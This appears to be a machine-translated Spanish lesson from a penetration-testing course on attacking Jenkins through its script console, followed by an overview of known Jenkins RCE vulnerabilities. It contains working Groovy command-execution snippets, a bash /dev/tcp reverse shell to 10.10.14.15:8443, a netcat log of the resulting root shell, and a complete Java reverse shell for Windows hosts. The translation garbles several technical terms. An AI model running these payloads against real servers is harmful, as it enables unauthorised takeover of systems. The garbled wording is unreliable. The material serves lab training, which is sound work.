# Attacking Jenkins

Hemos confirmado que el host está ejecutando Jenkins, y está configurado con credenciales débiles. Veamos y veamos qué tipo de acceso nos dará.

Una vez que hayamos obtenido acceso a una aplicación Jenkins, una forma rápida de lograr la ejecución de comandos en el servidor subyacente es a través del[Consola de guiones](https://www.jenkins.io/doc/book/managing/script-console/). La consola de script nos permite ejecutar scripts groovy arbitrarios dentro del tiempo de ejecución del controlador Jenkins. Esto se puede abusar de ejecutar comandos del sistema operativo en el servidor subyacente. Jenkins a menudo se instala en el contexto de la cuenta raíz o del sistema, por lo que puede ser una victoria fácil para nosotros.

---

# **Consola de guiones**

Se puede llegar a la consola de guiones en la URL`http://jenkins.inlanefreight.local:8000/script`. Esta consola permite que un usuario ejecute Apache[Groovy](https://en.wikipedia.org/wiki/Apache_Groovy)Scripts, que son un lenguaje compatible con Java orientado a objetos. El lenguaje es similar a Python y Ruby. El código fuente Groovy se compila en Java Bytecode y puede ejecutarse en cualquier plataforma que haya instalado JRE.

Usando esta consola de script, es posible ejecutar comandos arbitrarios, que funcionen de manera similar a un shell web. Por ejemplo, podemos usar el siguiente fragmento para ejecutar el`id`dominio.

Código:groovy

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout

```

![](https://academy.hackthebox.com/storage/modules/113/groovy_web.png)

Hay varias formas en que se puede aprovechar el acceso a la consola de script para obtener una carcasa inversa. Por ejemplo, usando el comando a continuación, o[este](https://web.archive.org/web/20230326230234/https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/)Módulo MetaSploit.

Código:groovy

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

```

Ejecutar los comandos anteriores da como resultado una conexión de shell inverso.

Atacando a Jenkins

```
xnoxos@htb[/htb]$ nc -lvnp 8443listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844

id

uid=0(root) gid=0(root) groups=0(root)

/bin/bash -i

root@app02:/var/lib/jenkins3#

```

Con un host de Windows, podríamos intentar agregar un usuario y conectarse al host a través de RDP o WinRM o, para evitar hacer un cambio en el sistema, usar una descarga de PowerShell Cuns[Invoke-Powershelltcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Podríamos ejecutar comandos en una instalación de Jenkins basada en Windows usando este fragmento:

Código:groovy

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");

```

También podríamos usar[este](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy)Java Reverse Shell para obtener la ejecución de comandos en un host de Windows, intercambiando`localhost`y el puerto para nuestra dirección IP y puerto del oyente.

Código:groovy

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```

---

# **Vulnerabilidades diversas**

Existen varias vulnerabilidades de ejecución de código remoto en varias versiones de Jenkins. Un exploit reciente combina dos vulnerabilidades, CVE-2018-1999002 y[CVE-2019-1003000](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266)Para lograr la ejecución de código remoto preautenticado, evitando la protección de sandbox de seguridad del script durante la compilación de script. Existen POC de explotación pública para explotar un defecto en el enrutamiento dinámico de Jenkins para evitar el ACL general / lectura y usar Groovy para descargar y ejecutar un archivo JAR malicioso. Esta falla permite a los usuarios con permisos de lectura para evitar las protecciones de Sandbox y ejecutar código en el servidor Master Jenkins. Este exploit funciona contra Jenkins versión 2.137.

Existe otra vulnerabilidad en Jenkins 2.150.2, que permite a los usuarios de creación de empleo y construir privilegios para ejecutar código en el sistema a través de Node.js. Esta vulnerabilidad requiere autenticación, pero si los usuarios anónimos están habilitados, el exploit tendrá éxito porque estos usuarios tienen creación de empleo y crean privilegios de forma predeterminada.

Como hemos visto, obtener acceso a Jenkins como administrador puede conducir rápidamente a la ejecución de código remoto. Si bien existen varios exploits de RCE en funcionamiento para Jenkins, son específicos de la versión. Al momento de escribir, el lanzamiento actual LTS de Jenkins es 2.303.1, que fija los dos defectos detallados anteriormente. Al igual que con cualquier aplicación o sistema, es importante endurecer a Jenkins tanto como sea posible, ya que la funcionalidad incorporada se puede usar fácilmente para hacerse cargo del servidor subyacente.

---

# **Engranajes de cambio**

Hemos cubierto varias formas en que las aplicaciones populares de desarrollo de software CMS y Servlet se pueden abusar de explotar tanto las vulnerabilidades conocidas como la funcionalidad incorporada. Cambiemos nuestro enfoque un poco a dos herramientas de monitoreo de red/infraestructura bien conocidas: Splunk y PRTG Network Monitor.